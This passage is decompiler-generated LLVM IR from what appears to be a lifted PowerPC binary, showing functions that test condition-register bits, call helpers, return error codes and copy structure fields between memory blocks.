  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 18, { 8, 9, 10, 3, 4, 6, 0, 5, 7, 11, 12, 1, 13, 2, 14, 15 }
  uselistorder i32 22, { 1, 2, 3, 4, 11, 5, 6, 7, 8, 10, 13, 14, 12, 9, 0 }
  uselistorder i32 7, { 39, 54, 12, 13, 34, 14, 15, 35, 16, 17, 36, 18, 19, 37, 38, 1, 55, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0, 29, 40, 2, 41, 3, 42, 43, 44, 4, 5, 6, 45, 7, 46, 8, 47, 30, 48, 31, 49, 50, 9, 51, 52, 10, 53, 32, 56, 33, 57, 58, 11 }
  uselistorder i32 19, { 17, 18, 1, 2, 0, 14, 15, 16, 4, 7, 8, 11, 9, 10, 12, 13, 23, 3, 19, 20, 21, 22, 5, 6 }
  uselistorder i32* @r25, { 3, 4, 5, 16, 17, 18, 19, 20, 1, 2, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 21 }
  uselistorder i32* @r27, { 27, 19, 20, 66, 67, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 23, 21, 22, 1, 24, 25, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0, 40, 41, 68, 69, 70, 71, 72, 73, 74, 75, 76 }
  uselistorder i32 23, { 6, 5, 9, 0, 1, 4, 7, 2, 8, 3 }
  uselistorder i32* @r22, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 14 }
  uselistorder i32* @r23, { 10, 0, 11, 19, 20, 21, 22, 23, 24, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 13, 14, 15, 16, 17, 18, 25 }
  uselistorder i32* @r1, { 9, 10, 4, 5, 13, 1, 14, 0, 11, 12, 8, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 34, 35, 36, 37, 38, 39, 6, 40, 7, 41, 32, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 2, 72, 3, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 12, 13, 14, 37, 18, 26, 19, 27, 0, 39, 38, 1, 2, 3, 28, 29, 30, 31, 20, 21, 22, 23, 24, 25, 11, 15, 16, 17, 4, 6, 7, 5, 8, 9, 10, 32, 33, 35, 34, 36, 40 }
  uselistorder i32 27, { 1, 2, 3, 4, 5, 6, 0, 7, 8 }
  uselistorder i32 30, { 4, 15, 0, 8, 9, 10, 1, 5, 2, 6, 3, 7, 11, 12, 13, 14 }
  uselistorder label %dec_label_pc_1000d568, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d564, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000d4b8, { 1, 0 }
}

define i32 @function_1000d584() local_unnamed_addr {
dec_label_pc_1000d584:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d59c = call i32 @__asm_mfcr()
  %v1_1000d5a0 = and i32 %v0_1000d59c, 268435456
  %v3_1000d5a0 = icmp eq i32 %v1_1000d5a0, 0
  store i32 %v0_1000d59c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d5a0, label %dec_label_pc_1000d5b8, label %dec_label_pc_1000d5ac

dec_label_pc_1000d5ac:                            ; preds = %dec_label_pc_1000d584
  %v0_1000d5ac = call i32 @function_1000bb0c()
  %v0_1000d5b0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d5b0 = inttoptr i32 %v0_1000d5ac to i32*
  store i32 %v0_1000d5b0, i32* %v2_1000d5b0, align 4
  br label %dec_label_pc_1000d5b8

dec_label_pc_1000d5b8:                            ; preds = %dec_label_pc_1000d584, %dec_label_pc_1000d5ac
  %v0_1000d5c8 = phi i32 [ %v0_1000d59c, %dec_label_pc_1000d584 ], [ -1, %dec_label_pc_1000d5ac ]
  ret i32 %v0_1000d5c8

; uselistorder directives
  uselistorder label %dec_label_pc_1000d5b8, { 1, 0 }
}

define i32 @function_1000d5cc() local_unnamed_addr {
dec_label_pc_1000d5cc:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d5e4 = call i32 @__asm_mfcr()
  %v1_1000d5e8 = and i32 %v0_1000d5e4, 268435456
  %v3_1000d5e8 = icmp eq i32 %v1_1000d5e8, 0
  store i32 %v0_1000d5e4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d5e8, label %dec_label_pc_1000d600, label %dec_label_pc_1000d5f4

dec_label_pc_1000d5f4:                            ; preds = %dec_label_pc_1000d5cc
  %v0_1000d5f4 = call i32 @function_1000bb0c()
  %v0_1000d5f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d5f8 = inttoptr i32 %v0_1000d5f4 to i32*
  store i32 %v0_1000d5f8, i32* %v2_1000d5f8, align 4
  br label %dec_label_pc_1000d600

dec_label_pc_1000d600:                            ; preds = %dec_label_pc_1000d5cc, %dec_label_pc_1000d5f4
  %v0_1000d610 = phi i32 [ %v0_1000d5e4, %dec_label_pc_1000d5cc ], [ -1, %dec_label_pc_1000d5f4 ]
  ret i32 %v0_1000d610

; uselistorder directives
  uselistorder label %dec_label_pc_1000d600, { 1, 0 }
}

define i32 @function_1000d614(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000d614:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d62c = call i32 @__asm_mfcr()
  %v1_1000d630 = and i32 %v0_1000d62c, 268435456
  %v3_1000d630 = icmp eq i32 %v1_1000d630, 0
  store i32 %v0_1000d62c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d630, label %dec_label_pc_1000d648, label %dec_label_pc_1000d63c

dec_label_pc_1000d63c:                            ; preds = %dec_label_pc_1000d614
  %v0_1000d63c = call i32 @function_1000bb0c()
  %v0_1000d640 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d640 = inttoptr i32 %v0_1000d63c to i32*
  store i32 %v0_1000d640, i32* %v2_1000d640, align 4
  br label %dec_label_pc_1000d648

dec_label_pc_1000d648:                            ; preds = %dec_label_pc_1000d614, %dec_label_pc_1000d63c
  %v0_1000d658 = phi i32 [ %v0_1000d62c, %dec_label_pc_1000d614 ], [ -1, %dec_label_pc_1000d63c ]
  ret i32 %v0_1000d658

; uselistorder directives
  uselistorder label %dec_label_pc_1000d648, { 1, 0 }
}

define i32 @function_1000d65c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000d65c:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d674 = call i32 @__asm_mfcr()
  %v1_1000d678 = and i32 %v0_1000d674, 268435456
  %v3_1000d678 = icmp eq i32 %v1_1000d678, 0
  store i32 %v0_1000d674, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d678, label %dec_label_pc_1000d690, label %dec_label_pc_1000d684

dec_label_pc_1000d684:                            ; preds = %dec_label_pc_1000d65c
  %v0_1000d684 = call i32 @function_1000bb0c()
  %v0_1000d688 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d688 = inttoptr i32 %v0_1000d684 to i32*
  store i32 %v0_1000d688, i32* %v2_1000d688, align 4
  br label %dec_label_pc_1000d690

dec_label_pc_1000d690:                            ; preds = %dec_label_pc_1000d65c, %dec_label_pc_1000d684
  %v0_1000d6a0 = phi i32 [ %v0_1000d674, %dec_label_pc_1000d65c ], [ -1, %dec_label_pc_1000d684 ]
  ret i32 %v0_1000d6a0

; uselistorder directives
  uselistorder label %dec_label_pc_1000d690, { 1, 0 }
}

define i32 @function_1000d6a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000d6a4:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000d6a4 = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_1000d6d0 = call i32 @__asm_mfcr()
  %v1_1000d6d4 = and i32 %v0_1000d6d0, 268435456
  %v3_1000d6d4 = icmp eq i32 %v1_1000d6d4, 0
  store i32 %v0_1000d6d0, i32* %r31.global-to-local, align 4
  store i32 %v0_1000d6d0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000d6d4, label %dec_label_pc_1000d6f8, label %dec_label_pc_1000d6e8

dec_label_pc_1000d6e8:                            ; preds = %dec_label_pc_1000d6a4
  %v0_1000d6e8 = call i32 @function_1000bb0c()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1000d6f0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d6f0 = inttoptr i32 %v0_1000d6e8 to i32*
  store i32 %v0_1000d6f0, i32* %v2_1000d6f0, align 4
  %v0_1000d6fc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000d6fc

dec_label_pc_1000d6f8:                            ; preds = %dec_label_pc_1000d6a4
  %v3_1000d6e0 = icmp eq i32 %v0_1000d6d0, 0
  br i1 %v3_1000d6e0, label %dec_label_pc_1000d708, label %dec_label_pc_1000d6fc

dec_label_pc_1000d6fc:                            ; preds = %dec_label_pc_1000d6f8, %dec_label_pc_1000d6e8
  %v0_1000d6fc = phi i32 [ %v0_1000d6d0, %dec_label_pc_1000d6f8 ], [ %v0_1000d6fc.pre, %dec_label_pc_1000d6e8 ]
  %tmp = icmp slt i32 %v0_1000d6fc, 0
  %v1_1000d700 = zext i1 %tmp to i32
  %v2_1000d700 = ashr i32 %v0_1000d6fc, 31
  %v3_1000d700 = and i32 %v2_1000d700, -2
  %v4_1000d700 = or i32 %v3_1000d700, %v1_1000d700
  br label %dec_label_pc_1000d710

dec_label_pc_1000d708:                            ; preds = %dec_label_pc_1000d6f8
  %v3_1000d708 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000d710

dec_label_pc_1000d710:                            ; preds = %dec_label_pc_1000d6fc, %dec_label_pc_1000d708
  %v0_1000d720 = phi i32 [ %v4_1000d700, %dec_label_pc_1000d6fc ], [ %v3_1000d708, %dec_label_pc_1000d708 ]
  store i32 %v0_1000d6a4, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000d720

; uselistorder directives
  uselistorder i32 %v0_1000d6fc, { 1, 0 }
  uselistorder i32 %v0_1000d6d0, { 0, 3, 2, 1, 4 }
  uselistorder i32 -2, { 7, 6, 1, 0, 8, 9, 12, 10, 2, 11, 3, 13, 4, 5, 14, 15, 16, 17, 18, 19 }
  uselistorder label %dec_label_pc_1000d710, { 1, 0 }
}

define i32 @function_1000d724(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000d724:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d73c = call i32 @__asm_mfcr()
  %v1_1000d740 = and i32 %v0_1000d73c, 268435456
  %v3_1000d740 = icmp eq i32 %v1_1000d740, 0
  store i32 %v0_1000d73c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d740, label %dec_label_pc_1000d758, label %dec_label_pc_1000d74c

dec_label_pc_1000d74c:                            ; preds = %dec_label_pc_1000d724
  %v0_1000d74c = call i32 @function_1000bb0c()
  %v0_1000d750 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d750 = inttoptr i32 %v0_1000d74c to i32*
  store i32 %v0_1000d750, i32* %v2_1000d750, align 4
  br label %dec_label_pc_1000d758

dec_label_pc_1000d758:                            ; preds = %dec_label_pc_1000d724, %dec_label_pc_1000d74c
  %v0_1000d768 = phi i32 [ %v0_1000d73c, %dec_label_pc_1000d724 ], [ -1, %dec_label_pc_1000d74c ]
  ret i32 %v0_1000d768

; uselistorder directives
  uselistorder label %dec_label_pc_1000d758, { 1, 0 }
}

define i32 @function_1000d76c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000d76c:
  store i32 %arg1, i32* @r30, align 4
  %v3_1000d788 = load i32, i32* @global_var_1001eb7c.524, align 4
  %v3_1000d78c = icmp eq i32 %v3_1000d788, 0
  br i1 %v3_1000d78c, label %dec_label_pc_1000d794, label %dec_label_pc_1000d7a0

dec_label_pc_1000d794:                            ; preds = %dec_label_pc_1000d76c
  store i32 268490648, i32* @lr, align 4
  %v1_1000d794 = call i32 @function_1000dcc4(i32 0)
  %v1_1000d798 = icmp slt i32 %v1_1000d794, 0
  br i1 %v1_1000d798, label %dec_label_pc_1000d7c0, label %dec_label_pc_1000d794.dec_label_pc_1000d7a0_crit_edge

dec_label_pc_1000d794.dec_label_pc_1000d7a0_crit_edge: ; preds = %dec_label_pc_1000d794
  %v0_1000d7a0.pre = load i32, i32* @r30, align 4
  %v3_1000d7a4.pre = load i32, i32* @global_var_1001eb7c.524, align 4
  br label %dec_label_pc_1000d7a0

dec_label_pc_1000d7a0:                            ; preds = %dec_label_pc_1000d794.dec_label_pc_1000d7a0_crit_edge, %dec_label_pc_1000d76c
  %v3_1000d7a4 = phi i32 [ %v3_1000d7a4.pre, %dec_label_pc_1000d794.dec_label_pc_1000d7a0_crit_edge ], [ %v3_1000d788, %dec_label_pc_1000d76c ]
  %v1_1000d7ac = phi i32 [ %v0_1000d7a0.pre, %dec_label_pc_1000d794.dec_label_pc_1000d7a0_crit_edge ], [ %arg1, %dec_label_pc_1000d76c ]
  %v3_1000d7a0 = icmp eq i32 %v1_1000d7ac, 0
  store i32 %v3_1000d7a4, i32* @r31, align 4
  br i1 %v3_1000d7a0, label %dec_label_pc_1000d7c4, label %dec_label_pc_1000d7b4

dec_label_pc_1000d7b4:                            ; preds = %dec_label_pc_1000d7a0
  %v2_1000d7ac = add i32 %v1_1000d7ac, %v3_1000d7a4
  store i32 268490680, i32* @lr, align 4
  %v1_1000d7b4 = call i32 @function_1000dcc4(i32 %v2_1000d7ac)
  %tmp6 = icmp sgt i32 %v1_1000d7b4, -1
  br i1 %tmp6, label %dec_label_pc_1000d7b4.dec_label_pc_1000d7c4_crit_edge, label %dec_label_pc_1000d7c0

dec_label_pc_1000d7b4.dec_label_pc_1000d7c4_crit_edge: ; preds = %dec_label_pc_1000d7b4
  %v0_1000d7c8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d7c4

dec_label_pc_1000d7c0:                            ; preds = %dec_label_pc_1000d7b4, %dec_label_pc_1000d794
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_1000d7c4

dec_label_pc_1000d7c4:                            ; preds = %dec_label_pc_1000d7b4.dec_label_pc_1000d7c4_crit_edge, %dec_label_pc_1000d7a0, %dec_label_pc_1000d7c0
  %v0_1000d7c8 = phi i32 [ %v0_1000d7c8.pre, %dec_label_pc_1000d7b4.dec_label_pc_1000d7c4_crit_edge ], [ %v3_1000d7a4, %dec_label_pc_1000d7a0 ], [ -1, %dec_label_pc_1000d7c0 ]
  ret i32 %v0_1000d7c8

; uselistorder directives
  uselistorder i32 %v3_1000d7a4, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_1000dcc4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d7c4, { 2, 0, 1 }
}

define i32 @function_1000d7dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000d7dc:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d7f4 = call i32 @__asm_mfcr()
  %v1_1000d7f8 = and i32 %v0_1000d7f4, 268435456
  %v3_1000d7f8 = icmp eq i32 %v1_1000d7f8, 0
  store i32 %v0_1000d7f4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d7f8, label %dec_label_pc_1000d810, label %dec_label_pc_1000d804

dec_label_pc_1000d804:                            ; preds = %dec_label_pc_1000d7dc
  %v0_1000d804 = call i32 @function_1000bb0c()
  %v0_1000d808 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d808 = inttoptr i32 %v0_1000d804 to i32*
  store i32 %v0_1000d808, i32* %v2_1000d808, align 4
  br label %dec_label_pc_1000d810

dec_label_pc_1000d810:                            ; preds = %dec_label_pc_1000d7dc, %dec_label_pc_1000d804
  %v0_1000d820 = phi i32 [ %v0_1000d7f4, %dec_label_pc_1000d7dc ], [ -1, %dec_label_pc_1000d804 ]
  ret i32 %v0_1000d820

; uselistorder directives
  uselistorder label %dec_label_pc_1000d810, { 1, 0 }
}

define i32 @function_1000d824(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000d824:
  %r10.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* %r28.global-to-local, align 4
  store i32 268490828, i32* @lr, align 4
  %v3_1000d848 = call i32 @function_1000bc90(i32 %arg2, i32 0, i32 104)
  %v2_1000d84c = load i32, i32* %arg1, align 4
  %v1_1000d850 = add i32 %tmp, 4
  %v2_1000d850 = inttoptr i32 %v1_1000d850 to i32*
  %v3_1000d850 = load i32, i32* %v2_1000d850, align 4
  store i32 %v3_1000d850, i32* %r10.global-to-local, align 4
  %v1_1000d854 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d854 = inttoptr i32 %v1_1000d854 to i32*
  store i32 %v2_1000d84c, i32* %v2_1000d854, align 4
  %v0_1000d858 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d858 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d858 = add i32 %v1_1000d858, 4
  %v3_1000d858 = inttoptr i32 %v2_1000d858 to i32*
  store i32 %v0_1000d858, i32* %v3_1000d858, align 4
  %v0_1000d85c = load i32, i32* %r28.global-to-local, align 4
  %v1_1000d85c = add i32 %v0_1000d85c, 8
  %v2_1000d85c = inttoptr i32 %v1_1000d85c to i32*
  %v3_1000d85c = load i32, i32* %v2_1000d85c, align 4
  %v1_1000d860 = add i32 %v0_1000d85c, 12
  %v2_1000d860 = inttoptr i32 %v1_1000d860 to i32*
  %v3_1000d860 = load i32, i32* %v2_1000d860, align 4
  store i32 %v3_1000d860, i32* %r10.global-to-local, align 4
  %v1_1000d864 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d864 = add i32 %v1_1000d864, 8
  %v3_1000d864 = inttoptr i32 %v2_1000d864 to i32*
  store i32 %v3_1000d85c, i32* %v3_1000d864, align 4
  %v0_1000d868 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d868 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d868 = add i32 %v1_1000d868, 12
  %v3_1000d868 = inttoptr i32 %v2_1000d868 to i32*
  store i32 %v0_1000d868, i32* %v3_1000d868, align 4
  %v0_1000d86c = load i32, i32* %r28.global-to-local, align 4
  %v1_1000d86c = add i32 %v0_1000d86c, 16
  %v2_1000d86c = inttoptr i32 %v1_1000d86c to i32*
  %v3_1000d86c = load i32, i32* %v2_1000d86c, align 4
  %v1_1000d870 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d870 = add i32 %v1_1000d870, 16
  %v3_1000d870 = inttoptr i32 %v2_1000d870 to i32*
  store i32 %v3_1000d86c, i32* %v3_1000d870, align 4
  %v0_1000d874 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000d874 = add i32 %v0_1000d874, 20
  %v2_1000d874 = inttoptr i32 %v1_1000d874 to i32*
  %v3_1000d874 = load i32, i32* %v2_1000d874, align 4
  %v1_1000d878 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d878 = add i32 %v1_1000d878, 20
  %v3_1000d878 = inttoptr i32 %v2_1000d878 to i32*
  store i32 %v3_1000d874, i32* %v3_1000d878, align 4
  %v0_1000d87c = load i32, i32* %r28.global-to-local, align 4
  %v1_1000d87c = add i32 %v0_1000d87c, 24
  %v2_1000d87c = inttoptr i32 %v1_1000d87c to i32*
  %v3_1000d87c = load i32, i32* %v2_1000d87c, align 4
  %v1_1000d880 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d880 = add i32 %v1_1000d880, 24
  %v3_1000d880 = inttoptr i32 %v2_1000d880 to i32*
  store i32 %v3_1000d87c, i32* %v3_1000d880, align 4
  %v0_1000d884 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000d884 = add i32 %v0_1000d884, 28
  %v2_1000d884 = inttoptr i32 %v1_1000d884 to i32*
  %v3_1000d884 = load i32, i32* %v2_1000d884, align 4
  %v1_1000d888 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d888 = add i32 %v1_1000d888, 28
  %v3_1000d888 = inttoptr i32 %v2_1000d888 to i32*
  store i32 %v3_1000d884, i32* %v3_1000d888, align 4
  %v0_1000d88c = load i32, i32* %r28.global-to-local, align 4
  %v1_1000d88c = add i32 %v0_1000d88c, 32
  %v2_1000d88c = inttoptr i32 %v1_1000d88c to i32*
  %v3_1000d88c = load i32, i32* %v2_1000d88c, align 4
  %v1_1000d890 = add i32 %v0_1000d88c, 36
  %v2_1000d890 = inttoptr i32 %v1_1000d890 to i32*
  %v3_1000d890 = load i32, i32* %v2_1000d890, align 4
  store i32 %v3_1000d890, i32* %r10.global-to-local, align 4
  %v1_1000d894 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d894 = add i32 %v1_1000d894, 32
  %v3_1000d894 = inttoptr i32 %v2_1000d894 to i32*
  store i32 %v3_1000d88c, i32* %v3_1000d894, align 4
  %v0_1000d898 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d898 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d898 = add i32 %v1_1000d898, 36
  %v3_1000d898 = inttoptr i32 %v2_1000d898 to i32*
  store i32 %v0_1000d898, i32* %v3_1000d898, align 4
  %v0_1000d89c = load i32, i32* %r28.global-to-local, align 4
  %v1_1000d89c = add i32 %v0_1000d89c, 48
  %v2_1000d89c = inttoptr i32 %v1_1000d89c to i32*
  %v3_1000d89c = load i32, i32* %v2_1000d89c, align 4
  %v1_1000d8a0 = add i32 %v0_1000d89c, 52
  %v2_1000d8a0 = inttoptr i32 %v1_1000d8a0 to i32*
  %v3_1000d8a0 = load i32, i32* %v2_1000d8a0, align 4
  store i32 %v3_1000d8a0, i32* %r10.global-to-local, align 4
  %v1_1000d8a4 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d8a4 = add i32 %v1_1000d8a4, 48
  %v3_1000d8a4 = inttoptr i32 %v2_1000d8a4 to i32*
  store i32 %v3_1000d89c, i32* %v3_1000d8a4, align 4
  %v0_1000d8a8 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d8a8 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d8a8 = add i32 %v1_1000d8a8, 52
  %v3_1000d8a8 = inttoptr i32 %v2_1000d8a8 to i32*
  store i32 %v0_1000d8a8, i32* %v3_1000d8a8, align 4
  %v0_1000d8ac = load i32, i32* %r28.global-to-local, align 4
  %v1_1000d8ac = add i32 %v0_1000d8ac, 56
  %v2_1000d8ac = inttoptr i32 %v1_1000d8ac to i32*
  %v3_1000d8ac = load i32, i32* %v2_1000d8ac, align 4
  %v1_1000d8b0 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d8b0 = add i32 %v1_1000d8b0, 56
  %v3_1000d8b0 = inttoptr i32 %v2_1000d8b0 to i32*
  store i32 %v3_1000d8ac, i32* %v3_1000d8b0, align 4
  %v0_1000d8b4 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000d8b4 = add i32 %v0_1000d8b4, 64
  %v2_1000d8b4 = inttoptr i32 %v1_1000d8b4 to i32*
  %v3_1000d8b4 = load i32, i32* %v2_1000d8b4, align 4
  %v1_1000d8b8 = add i32 %v0_1000d8b4, 68
  %v2_1000d8b8 = inttoptr i32 %v1_1000d8b8 to i32*
  %v3_1000d8b8 = load i32, i32* %v2_1000d8b8, align 4
  store i32 %v3_1000d8b8, i32* %r10.global-to-local, align 4
  %v1_1000d8bc = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d8bc = add i32 %v1_1000d8bc, 64
  %v3_1000d8bc = inttoptr i32 %v2_1000d8bc to i32*
  store i32 %v3_1000d8b4, i32* %v3_1000d8bc, align 4
  %v0_1000d8c0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d8c0 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d8c0 = add i32 %v1_1000d8c0, 68
  %v3_1000d8c0 = inttoptr i32 %v2_1000d8c0 to i32*
  store i32 %v0_1000d8c0, i32* %v3_1000d8c0, align 4
  %v0_1000d8c4 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000d8c4 = add i32 %v0_1000d8c4, 72
  %v2_1000d8c4 = inttoptr i32 %v1_1000d8c4 to i32*
  %v3_1000d8c4 = load i32, i32* %v2_1000d8c4, align 4
  %v1_1000d8c8 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d8c8 = add i32 %v1_1000d8c8, 72
  %v3_1000d8c8 = inttoptr i32 %v2_1000d8c8 to i32*
  store i32 %v3_1000d8c4, i32* %v3_1000d8c8, align 4
  %v0_1000d8cc = load i32, i32* %r28.global-to-local, align 4
  %v1_1000d8cc = add i32 %v0_1000d8cc, 80
  %v2_1000d8cc = inttoptr i32 %v1_1000d8cc to i32*
  %v3_1000d8cc = load i32, i32* %v2_1000d8cc, align 4
  %v1_1000d8d0 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d8d0 = add i32 %v1_1000d8d0, 80
  %v3_1000d8d0 = inttoptr i32 %v2_1000d8d0 to i32*
  store i32 %v3_1000d8cc, i32* %v3_1000d8d0, align 4
  %v0_1000d8d4 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000d8d4 = add i32 %v0_1000d8d4, 88
  %v2_1000d8d4 = inttoptr i32 %v1_1000d8d4 to i32*
  %v3_1000d8d4 = load i32, i32* %v2_1000d8d4, align 4
  %v1_1000d8d8 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d8d8 = add i32 %v1_1000d8d8, 88
  %v3_1000d8d8 = inttoptr i32 %v2_1000d8d8 to i32*
  store i32 %v3_1000d8d4, i32* %v3_1000d8d8, align 4
  ret i32 %v3_1000d848

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32 80, { 2, 3, 4, 1, 0 }
  uselistorder i32 104, { 0, 1, 4, 3, 5, 2, 6 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_1000d8f0(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000d8f0:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1000d8f4 = load i32, i32* @lr, align 4
  store i32 %v0_1000d8f4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 268491032, i32* @lr, align 4
  %v3_1000d914 = call i32 @function_1000bc90(i32 %arg2, i32 0, i32 88)
  %v0_1000d918 = load i32, i32* @r28, align 4
  %v1_1000d918 = inttoptr i32 %v0_1000d918 to i32*
  %v2_1000d918 = load i32, i32* %v1_1000d918, align 4
  store i32 %v2_1000d918, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_1000d920 = load i32, i32* @r29, align 4
  %v2_1000d920 = add i32 %v1_1000d920, 4
  %v3_1000d920 = inttoptr i32 %v2_1000d920 to i32*
  store i32 %v2_1000d918, i32* %v3_1000d920, align 4
  %v0_1000d924 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d924 = load i32, i32* @r29, align 4
  %v2_1000d924 = inttoptr i32 %v1_1000d924 to i32*
  store i32 %v0_1000d924, i32* %v2_1000d924, align 4
  %v0_1000d928 = load i32, i32* @r28, align 4
  %v1_1000d928 = add i32 %v0_1000d928, 4
  %v2_1000d928 = inttoptr i32 %v1_1000d928 to i32*
  %v3_1000d928 = load i32, i32* %v2_1000d928, align 4
  store i32 %v3_1000d928, i32* %r0.global-to-local, align 4
  %v1_1000d92c = load i32, i32* @r29, align 4
  %v2_1000d92c = add i32 %v1_1000d92c, 12
  %v3_1000d92c = inttoptr i32 %v2_1000d92c to i32*
  store i32 %v3_1000d928, i32* %v3_1000d92c, align 4
  %v0_1000d930 = load i32, i32* @r28, align 4
  %v1_1000d930 = add i32 %v0_1000d930, 8
  %v2_1000d930 = inttoptr i32 %v1_1000d930 to i32*
  %v3_1000d930 = load i32, i32* %v2_1000d930, align 4
  store i32 %v3_1000d930, i32* %r0.global-to-local, align 4
  %v1_1000d934 = load i32, i32* @r29, align 4
  %v2_1000d934 = add i32 %v1_1000d934, 16
  %v3_1000d934 = inttoptr i32 %v2_1000d934 to i32*
  store i32 %v3_1000d930, i32* %v3_1000d934, align 4
  %v0_1000d938 = load i32, i32* @r28, align 4
  %v1_1000d938 = add i32 %v0_1000d938, 12
  %v2_1000d938 = inttoptr i32 %v1_1000d938 to i16*
  %v3_1000d938 = load i16, i16* %v2_1000d938, align 2
  %v4_1000d938 = zext i16 %v3_1000d938 to i32
  store i32 %v4_1000d938, i32* %r0.global-to-local, align 4
  %v1_1000d93c = load i32, i32* @r29, align 4
